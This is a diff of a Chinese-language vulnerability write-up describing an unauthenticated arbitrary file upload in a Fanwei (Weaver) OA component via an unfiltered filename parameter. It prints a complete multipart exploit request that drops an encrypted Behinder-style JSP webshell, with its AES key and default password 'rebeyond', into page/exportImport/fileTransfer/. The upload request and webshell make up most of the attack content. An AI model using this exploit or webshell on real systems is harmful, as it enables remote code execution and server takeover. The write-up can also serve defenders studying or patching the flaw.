@@ -20,7 +20,7 @@ Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接�
 
 Filename参数,是前台可控的,并且没有做任何过滤限制
 
-![](image/fanwei-14.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-14.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 利用非常简单,只要对着
 
@@ -28,13 +28,13 @@ Filename参数,是前台可控的,并且没有做任何过滤限制
 
 来一个multipartRequest就可以,利用简单,自评高危!!
 
-![](image/fanwei-15.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-15.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 然后请求 然后请求路径:
 
 page/exportImport/fileTransfer/1.jsp
 
-![](image/fanwei-16.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-16.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 请求包
 
@@ -56,13 +56,13 @@ x-forwarded-for: 127.0.0.1
 Connection: close
 
 ------WebKitFormBoundary6XgyjB6SeCArD3Hc
-Content-Disposition: form-data; name="file"; filename="peiqi.jsp"
+Content-Disposition: form-data; name="file"; filename="test.jsp"
 Content-Type: application/octet-stream
 
 <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 ------WebKitFormBoundary6XgyjB6SeCArD3Hc--
 ```
 
-地址: /page/exportImport/fileTransfer/peiqi.jsp
+地址: /page/exportImport/fileTransfer/test.jsp
 
 默认密码 rebeyond
